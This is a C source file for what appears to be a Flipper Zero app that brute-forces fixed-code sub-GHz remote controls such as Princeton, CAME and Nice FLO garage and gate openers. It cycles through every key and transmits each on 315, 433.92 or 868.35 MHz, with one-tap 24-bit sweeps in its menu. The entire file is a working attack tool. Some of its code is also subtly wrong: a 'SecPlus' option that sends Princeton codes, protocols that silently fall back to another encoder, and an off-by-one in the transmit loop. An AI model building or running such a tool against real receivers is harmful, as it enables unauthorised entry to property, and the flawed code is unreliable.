#include "subghz_bf.h"
#include <stdlib.h>
#include <string.h>

const char* protocol_names[ProtocolCount] = {
    "Princeton 24b",
    "CAME 12b",
    "CAME 24b",
    "CAME Atomo",
    "Nice FLO 12b",
    "Nice FLO 24b",
    "Ansonic 12b",
    "Holtek HT12X",
    "PT2260",
    "SMC5326",
    "UNILARM 25b",
};

const char* freq_names[FreqCount] = {
    "315.00 MHz",
    "433.92 MHz",
    "868.35 MHz",
};

const uint32_t freq_values[FreqCount] = {
    315000000,
    433920000,
    868350000,
};

const uint8_t protocol_bits[ProtocolCount] = {
    24,
    12,
    24,
    18,
    12,
    24,
    12,
    12,
    24,
    25,
    25,
};

static uint8_t ook_buffer[512];
static uint16_t ook_buffer_len;

static void princeton_encode(uint32_t key, uint8_t bits, uint8_t* buf, uint16_t* len) {
    uint16_t pos = 0;
    uint32_t te = 400;

    buf[pos++] = 0x01;
    buf[pos++] = (uint8_t)((te * 32) >> 8);
    buf[pos++] = (uint8_t)(te * 32);
    buf[pos++] = (uint8_t)(te >> 8);
    buf[pos++] = (uint8_t)(te);

    for(int8_t i = bits - 1; i >= 0; i--) {
        if((key >> i) & 1) {
            buf[pos++] = 0x03;
            buf[pos++] = (uint8_t)(te >> 8);
            buf[pos++] = (uint8_t)(te);
            buf[pos++] = (uint8_t)(te >> 8);
            buf[pos++] = (uint8_t)(te);
        } else {
            buf[pos++] = 0x01;
            buf[pos++] = (uint8_t)(te >> 8);
            buf[pos++] = (uint8_t)(te);
            buf[pos++] = (uint8_t)((te * 3) >> 8);
            buf[pos++] = (uint8_t)(te * 3);
        }
    }

    buf[pos++] = 0x01;
    buf[pos++] = (uint8_t)(te >> 8);
    buf[pos++] = (uint8_t)(te);
    buf[pos++] = (uint8_t)((te * 31) >> 8);
    buf[pos++] = (uint8_t)(te * 31);

    *len = pos;
}

static void came_encode(uint32_t key, uint8_t bits, uint8_t* buf, uint16_t* len) {
    uint16_t pos = 0;
    uint32_t te = 320;

    buf[pos++] = 0x01;
    buf[pos++] = (uint8_t)((te * 36) >> 8);
    buf[pos++] = (uint8_t)(te * 36);
    buf[pos++] = (uint8_t)(te >> 8);
    buf[pos++] = (uint8_t)(te);

    for(int8_t i = bits - 1; i >= 0; i--) {
        if((key >> i) & 1) {
            buf[pos++] = 0x01;
            buf[pos++] = (uint8_t)((te * 2) >> 8);
            buf[pos++] = (uint8_t)(te * 2);
            buf[pos++] = (uint8_t)(te >> 8);
            buf[pos++] = (uint8_t)(te);
        } else {
            buf[pos++] = 0x01;
            buf[pos++] = (uint8_t)(te >> 8);
            buf[pos++] = (uint8_t)(te);
            buf[pos++] = (uint8_t)((te * 2) >> 8);
            buf[pos++] = (uint8_t)(te * 2);
        }
    }

    buf[pos++] = 0x01;
    buf[pos++] = (uint8_t)(te >> 8);
    buf[pos++] = (uint8_t)(te);

    *len = pos;
}

static void nice_flo_encode(uint32_t key, uint8_t bits, uint8_t* buf, uint16_t* len) {
    uint16_t pos = 0;
    uint32_t te = 500;

    buf[pos++] = 0x01;
    buf[pos++] = (uint8_t)((te * 14) >> 8);
    buf[pos++] = (uint8_t)(te * 14);
    buf[pos++] = (uint8_t)(te >> 8);
    buf[pos++] = (uint8_t)(te);

    for(int8_t i = bits - 1; i >= 0; i--) {
        if((key >> i) & 1) {
            buf[pos++] = 0x01;
            buf[pos++] = (uint8_t)((te * 2) >> 8);
            buf[pos++] = (uint8_t)(te * 2);
            buf[pos++] = (uint8_t)(te >> 8);
            buf[pos++] = (uint8_t)(te);
        } else {
            buf[pos++] = 0x01;
            buf[pos++] = (uint8_t)(te >> 8);
            buf[pos++] = (uint8_t)(te);
            buf[pos++] = (uint8_t)((te * 2) >> 8);
            buf[pos++] = (uint8_t)(te * 2);
        }
    }

    *len = pos;
}

static void build_packet(uint64_t key, BruteProtocol proto, uint8_t bits, uint8_t* buf, uint16_t* len) {
    switch(proto) {
    case ProtocolPrinceton:
        princeton_encode((uint32_t)key, bits, buf, len);
        break;
    case ProtocolCAME12:
    case ProtocolCAME24:
    case ProtocolCAMEAtomo:
        came_encode((uint32_t)key, bits, buf, len);
        break;
    case ProtocolNiceFlo12:
    case ProtocolNiceFlo24:
        nice_flo_encode((uint32_t)key, bits, buf, len);
        break;
    default:
        princeton_encode((uint32_t)key, bits, buf, len);
        break;
    }
}

static bool subghz_tx_single(SubGhzBrute* app) {
    uint16_t pkt_len = 0;
    build_packet(
        app->config.key_current,
        app->config.protocol,
        app->config.bit_count,
        ook_buffer,
        &pkt_len);

    if(pkt_len == 0) return false;

    furi_hal_subghz_reset();
    furi_hal_subghz_idle();

    if(!furi_hal_subghz_set_frequency_and_path(app->config.frequency)) {
        return false;
    }

    furi_hal_subghz_flush_tx();
    furi_hal_subghz_start_tx();

    for(uint8_t rep = 0; rep < app->config.repeat; rep++) {
        furi_hal_subghz_write_packet(ook_buffer, pkt_len);
        furi_delay_ms(5);
    }

    furi_delay_ms(app->config.delay_ms);
    furi_hal_subghz_stop_tx();
    furi_hal_subghz_idle();

    return true;
}

static int32_t brute_worker(void* ctx) {
    SubGhzBrute* app = ctx;

    furi_mutex_acquire(app->state_mutex, FuriWaitForever);
    app->config.state = BFStateRunning;
    app->config.key_current = app->config.key_start;
    furi_mutex_release(app->state_mutex);

    while(true) {
        furi_mutex_acquire(app->state_mutex, FuriWaitForever);
        if(app->config.state != BFStateRunning) {
            furi_mutex_release(app->state_mutex);
            break;
        }
        if(app->config.key_current > app->config.key_end) {
            app->config.state = BFStateDone;
            furi_mutex_release(app->state_mutex);
            break;
        }
        uint64_t key = app->config.key_current;
        app->config.key_current++;
        app->config.tx_count++;
        furi_mutex_release(app->state_mutex);

        subghz_tx_single(app);
    }

    furi_hal_subghz_sleep();
    return 0;
}

static void run_view_draw_cb(Canvas* canvas, void* model) {
    SubGhzBrute* app = model;

    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 2, 12, "SubGHz Bruteforce");

    furi_mutex_acquire(app->state_mutex, FuriWaitForever);
    BFState state = app->config.state;
    uint64_t current = app->config.key_current;
    uint64_t end = app->config.key_end;
    uint64_t start = app->config.key_start;
    uint32_t tx_count = app->config.tx_count;
    furi_mutex_release(app->state_mutex);

    canvas_set_font(canvas, FontSecondary);

    char buf[32];
    snprintf(buf, sizeof(buf), "Key: %06llX", current);
    canvas_draw_str(canvas, 2, 26, buf);

    uint64_t total = end - start + 1;
    uint64_t done = current - start;
    uint8_t pct = (total > 0) ? (uint8_t)((done * 100) / total) : 0;

    snprintf(buf, sizeof(buf), "TX: %lu  %u%%", tx_count, pct);
    canvas_draw_str(canvas, 2, 38, buf);

    uint8_t bar_w = (uint8_t)((pct * 100) / 100);
    canvas_draw_box(canvas, 2, 44, bar_w, 5);
    canvas_draw_frame(canvas, 2, 44, 100, 5);

    const char* status_str =
        (state == BFStateRunning) ? "Running..." :
        (state == BFStateDone)    ? "Done!" :
        (state == BFStateError)   ? "Error!" : "Idle";
    canvas_draw_str(canvas, 2, 58, status_str);

    if(state == BFStateRunning) {
        canvas_draw_str(canvas, 80, 58, "[OK=Stop]");
    }
}

static bool run_view_input_cb(InputEvent* event, void* ctx) {
    SubGhzBrute* app = ctx;
    if(event->type == InputTypeShort && event->key == InputKeyOk) {
        furi_mutex_acquire(app->state_mutex, FuriWaitForever);
        if(app->config.state == BFStateRunning) {
            app->config.state = BFStateIdle;
        }
        furi_mutex_release(app->state_mutex);
        return true;
    }
    return false;
}

static void config_freq_changed(VariableItem* item) {
    SubGhzBrute* app = variable_item_get_context(item);
    uint8_t idx = variable_item_get_current_value_index(item);
    if(idx < FreqCount) {
        app->config.frequency = freq_values[idx];
        variable_item_set_current_value_text(item, freq_names[idx]);
    }
}

static void config_proto_changed(VariableItem* item) {
    SubGhzBrute* app = variable_item_get_context(item);
    uint8_t idx = variable_item_get_current_value_index(item);
    if(idx < ProtocolCount) {
        app->config.protocol = (BruteProtocol)idx;
        app->config.bit_count = protocol_bits[idx];
        app->config.key_end = (1ULL << app->config.bit_count) - 1;
        variable_item_set_current_value_text(item, protocol_names[idx]);
    }
}

static void config_delay_changed(VariableItem* item) {
    SubGhzBrute* app = variable_item_get_context(item);
    uint8_t idx = variable_item_get_current_value_index(item);
    static const uint32_t delays[] = {5, 10, 15, 20, 30, 50};
    static const char* delay_strs[] = {"5ms", "10ms", "15ms", "20ms", "30ms", "50ms"};
    if(idx < 6) {
        app->config.delay_ms = delays[idx];
        variable_item_set_current_value_text(item, delay_strs[idx]);
    }
}

void subghz_brute_scene_config_on_enter(void* ctx) {
    SubGhzBrute* app = ctx;
    variable_item_list_reset(app->var_list);

    VariableItem* item;

    item = variable_item_list_add(app->var_list, "Frequency", FreqCount, config_freq_changed, app);
    variable_item_set_current_value_index(item, 1);
    variable_item_set_current_value_text(item, freq_names[1]);

    item = variable_item_list_add(app->var_list, "Protocol", ProtocolCount, config_proto_changed, app);
    variable_item_set_current_value_index(item, 0);
    variable_item_set_current_value_text(item, protocol_names[0]);

    item = variable_item_list_add(app->var_list, "TX Delay", 6, config_delay_changed, app);
    variable_item_set_current_value_index(item, 2);
    variable_item_set_current_value_text(item, "15ms");

    view_dispatcher_switch_to_view(app->view_dispatcher, BFViewConfig);
}

bool subghz_brute_scene_config_on_event(void* ctx, SceneManagerEvent event) {
    SubGhzBrute* app = ctx;
    if(event.type == SceneManagerEventTypeCustom && event.event == BFEventStart) {
        app->config.key_start = 0;
        app->config.key_end = (1ULL << app->config.bit_count) - 1;
        app->config.key_current = 0;
        app->config.tx_count = 0;
        app->config.state = BFStateIdle;

        app->worker_thread = furi_thread_alloc_ex(
            "BruteWorker",
            4096,
            brute_worker,
            app);
        furi_thread_start(app->worker_thread);

        scene_manager_next_scene(app->scene_manager, BFSceneRun);
        return true;
    }
    return false;
}

void subghz_brute_scene_config_on_exit(void* ctx) {
    SubGhzBrute* app = ctx;
    variable_item_list_reset(app->var_list);
}

void subghz_brute_scene_run_on_enter(void* ctx) {
    SubGhzBrute* app = ctx;
    view_set_draw_callback(app->run_view, run_view_draw_cb);
    view_set_input_callback(app->run_view, run_view_input_cb);
    view_set_context(app->run_view, app);
    view_dispatcher_switch_to_view(app->view_dispatcher, BFViewRun);
}

bool subghz_brute_scene_run_on_event(void* ctx, SceneManagerEvent event) {
    UNUSED(ctx);
    UNUSED(event);
    return false;
}

void subghz_brute_scene_run_on_exit(void* ctx) {
    SubGhzBrute* app = ctx;
    furi_mutex_acquire(app->state_mutex, FuriWaitForever);
    app->config.state = BFStateIdle;
    furi_mutex_release(app->state_mutex);
    if(app->worker_thread) {
        furi_thread_join(app->worker_thread);
        furi_thread_free(app->worker_thread);
        app->worker_thread = NULL;
    }
    furi_hal_subghz_sleep();
}

static const char* main_items[] = {
    "Configure & Start",
    "Quick 433MHz Princeton",
    "Quick 315MHz SecPlus",
};

static void main_menu_cb(void* ctx, uint32_t idx) {
    SubGhzBrute* app = ctx;
    if(idx == 0) {
        scene_manager_next_scene(app->scene_manager, BFSceneConfig);
    } else if(idx == 1) {
        app->config.frequency = 433920000;
        app->config.protocol = ProtocolPrinceton;
        app->config.bit_count = 24;
        app->config.key_start = 0;
        app->config.key_end = 0xFFFFFF;
        app->config.delay_ms = 15;
        app->config.repeat = SUBGHZ_BF_REPEAT_COUNT;
        app->config.key_current = 0;
        app->config.tx_count = 0;
        app->config.state = BFStateIdle;
        app->worker_thread = furi_thread_alloc_ex("BruteWorker", 4096, brute_worker, app);
        furi_thread_start(app->worker_thread);
        scene_manager_next_scene(app->scene_manager, BFSceneRun);
    } else if(idx == 2) {
        app->config.frequency = 315000000;
        app->config.protocol = ProtocolPrinceton;
        app->config.bit_count = 24;
        app->config.key_start = 0;
        app->config.key_end = 0xFFFFFF;
        app->config.delay_ms = 15;
        app->config.repeat = SUBGHZ_BF_REPEAT_COUNT;
        app->config.key_current = 0;
        app->config.tx_count = 0;
        app->config.state = BFStateIdle;
        app->worker_thread = furi_thread_alloc_ex("BruteWorker", 4096, brute_worker, app);
        furi_thread_start(app->worker_thread);
        scene_manager_next_scene(app->scene_manager, BFSceneRun);
    }
}

void subghz_brute_scene_main_on_enter(void* ctx) {
    SubGhzBrute* app = ctx;
    submenu_reset(app->submenu);
    for(uint8_t i = 0; i < 3; i++) {
        submenu_add_item(app->submenu, main_items[i], i, main_menu_cb, app);
    }
    view_dispatcher_switch_to_view(app->view_dispatcher, BFViewMenu);
}

bool subghz_brute_scene_main_on_event(void* ctx, SceneManagerEvent event) {
    UNUSED(ctx);
    UNUSED(event);
    return false;
}

void subghz_brute_scene_main_on_exit(void* ctx) {
    SubGhzBrute* app = ctx;
    submenu_reset(app->submenu);
}

static const SceneManagerHandlers brute_scene_handlers = {
    .on_enter_handlers = {
        subghz_brute_scene_main_on_enter,
        subghz_brute_scene_config_on_enter,
        subghz_brute_scene_run_on_enter,
    },
    .on_event_handlers = {
        subghz_brute_scene_main_on_event,
        subghz_brute_scene_config_on_event,
        subghz_brute_scene_run_on_event,
    },
    .on_exit_handlers = {
        subghz_brute_scene_main_on_exit,
        subghz_brute_scene_config_on_exit,
        subghz_brute_scene_run_on_exit,
    },
    .scene_num = BFSceneCount,
};

static bool brute_custom_cb(void* ctx, uint32_t event) {
    SubGhzBrute* app = ctx;
    return scene_manager_handle_custom_event(app->scene_manager, event);
}

static bool brute_back_cb(void* ctx) {
    SubGhzBrute* app = ctx;
    return scene_manager_handle_back_event(app->scene_manager);
}

static SubGhzBrute* subghz_brute_alloc(void) {
    SubGhzBrute* app = malloc(sizeof(SubGhzBrute));
    memset(app, 0, sizeof(SubGhzBrute));

    app->config.frequency = 433920000;
    app->config.protocol = ProtocolPrinceton;
    app->config.bit_count = 24;
    app->config.key_start = 0;
    app->config.key_end = 0xFFFFFF;
    app->config.delay_ms = SUBGHZ_BF_TX_DELAY_MS;
    app->config.repeat = SUBGHZ_BF_REPEAT_COUNT;
    app->config.state = BFStateIdle;

    app->state_mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    app->gui = furi_record_open(RECORD_GUI);
    app->notifications = furi_record_open(RECORD_NOTIFICATION);

    app->scene_manager = scene_manager_alloc(&brute_scene_handlers, app);
    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_enable_queue(app->view_dispatcher);
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);
    view_dispatcher_set_custom_event_callback(app->view_dispatcher, brute_custom_cb);
    view_dispatcher_set_navigation_event_callback(app->view_dispatcher, brute_back_cb);
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);

    app->submenu = submenu_alloc();
    view_dispatcher_add_view(app->view_dispatcher, BFViewMenu, submenu_get_view(app->submenu));

    app->var_list = variable_item_list_alloc();
    view_dispatcher_add_view(app->view_dispatcher, BFViewConfig, variable_item_list_get_view(app->var_list));

    app->run_view = view_alloc();
    view_dispatcher_add_view(app->view_dispatcher, BFViewRun, app->run_view);

    return app;
}

static void subghz_brute_free(SubGhzBrute* app) {
    if(app->worker_thread) {
        furi_mutex_acquire(app->state_mutex, FuriWaitForever);
        app->config.state = BFStateIdle;
        furi_mutex_release(app->state_mutex);
        furi_thread_join(app->worker_thread);
        furi_thread_free(app->worker_thread);
    }
    furi_hal_subghz_sleep();

    view_dispatcher_remove_view(app->view_dispatcher, BFViewMenu);
    view_dispatcher_remove_view(app->view_dispatcher, BFViewConfig);
    view_dispatcher_remove_view(app->view_dispatcher, BFViewRun);

    submenu_free(app->submenu);
    variable_item_list_free(app->var_list);
    view_free(app->run_view);

    scene_manager_free(app->scene_manager);
    view_dispatcher_free(app->view_dispatcher);

    furi_mutex_free(app->state_mutex);
    furi_record_close(RECORD_NOTIFICATION);
    furi_record_close(RECORD_GUI);

    free(app);
}

int32_t subghz_brute_app(void* p) {
    UNUSED(p);
    SubGhzBrute* app = subghz_brute_alloc();
    scene_manager_next_scene(app->scene_manager, BFSceneMain);
    view_dispatcher_run(app->view_dispatcher);
    subghz_brute_free(app);
    return 0;
}
